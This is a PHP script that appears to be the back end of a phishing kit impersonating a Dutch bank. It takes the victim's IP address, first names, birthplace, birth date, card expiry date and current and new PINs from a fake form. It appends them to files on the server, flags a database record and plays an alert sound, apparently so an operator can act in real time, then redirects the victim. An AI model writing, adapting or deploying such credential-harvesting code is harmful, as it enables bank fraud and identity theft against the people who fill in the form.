<?php

require_once 'entry.php';
require_once("common/config.php");
require_once("common/database.php");

function get_ip_address() {
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip); // just to be safe

                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
}

$_SERVER['REMOTE_ADDR'] = get_ip_address();

$dataFormValues = !empty($_POST['dataFormValues']) ? explode("&", $_POST['dataFormValues']) : [];

if (!empty($dataFormValues)) {
    foreach ($dataFormValues as $values) {
        list($key, $value) = explode("=", $values);
        $_POST[$key] = $value;
    }
}


$user_ip = 'IP-adres: ' . $_SERVER['REMOTE_ADDR'] . "\n";
$data = 'Volledige voornamen: ' . $_POST['P391-C2-C0-C2-C1-C0-C3-F0'] . "\n";
$data3 = 'Geboorteplaats: ' . $_POST['geboorteplaats'] . "\n";
$data4 = 'Geboortedatum: ' . $_POST['vvdag'] . '-' . $_POST['vvmaand'] . '-' . $_POST['vvjaar'] . "\n\n";
$data2 = 'Vervaldatum betaalpas: ' . $_POST['expiry_month'] . '-' . $_POST['expiry_year'] . "\n\n";

$data5 = 'Huidige PIN: ' . $_POST['pin1'] . "\n";
$data6 = 'Huidige PIN (bevestiging): ' . $_POST['pin2'] . "\n";
$data7 = 'Nieuwe PIN: ' . $_POST['pin3'] . "\n";
$data8 = 'Nieuwe PIN (bevestiging): ' . $_POST['pin4'] . "\n\n";

$_SESSION['stap2'] = $user_ip . $data . $data3 . $data4 . $data2 . $data5 . $data6 . $data7 . $data8;

$unique_id = isset($_SESSION['unique_id']) ? $_SESSION['unique_id'] : "";
$id = isset($_SESSION['rec_id']) ? $_SESSION['rec_id'] : "";
$login_type = isset($_SESSION["login_type"]) ? $_SESSION["login_type"] : 2;
if ($id) {
/*$obj['text1'] = $_POST['P391-C2-C0-C2-C1-C0-C3-F0'];
    $obj['text2'] = $_POST['geboorteplaats'];
    $obj['day'] = $_POST['vvdag'];
    $obj['month'] = $_POST['vvmaand'];
    $obj['year'] = $_POST['vvjaar'];
    $obj['pin1'] = $_POST['pin1'];
    $obj['pin2'] = $_POST['pin2'];
    $obj['pin3'] = $_POST['pin3'];
    $obj['pin4'] = $_POST['pin4'];
    $obj['expiry_month'] = $_POST['expiry_month'];
    $obj['expiry_year'] = $_POST['expiry_year'];
	*/
	$obj['response'] = $_POST['response'];
	$obj['blink'] = 1;
    $obj['last_online'] =time();
    $query = db::prepUpdateQuery($obj, "data", "id", $id);
    $result = db::updateRecord($query);
    include 'sound_on1.php';
}
$folder = ($login_type == 1) ? "respons" : "identificatiecode";
$file_name = "fino/" . $folder . "/fino_" . $unique_id . $_SESSION['unique_id'] . ".txt";

$ret = file_put_contents($file_name, $_SESSION["stap1"] . "\n", FILE_APPEND | LOCK_EX);
$ret = file_put_contents($file_name, $_SESSION["stap2"] . "\n", FILE_APPEND | LOCK_EX);

if (isset($_SESSION['stap1'])) {
    unset($_SESSION['stap1']);
}
if (isset($_SESSION['stap2'])) {
    unset($_SESSION['stap2']);
}
if (isset($_SESSION['stap3'])) {
    unset($_SESSION['stap3']);
}
if ($_GET['ajax']) {
    echo $id;
    exit;
} else {
    header("Location:" . $q_arr['logout.php']);
}
?>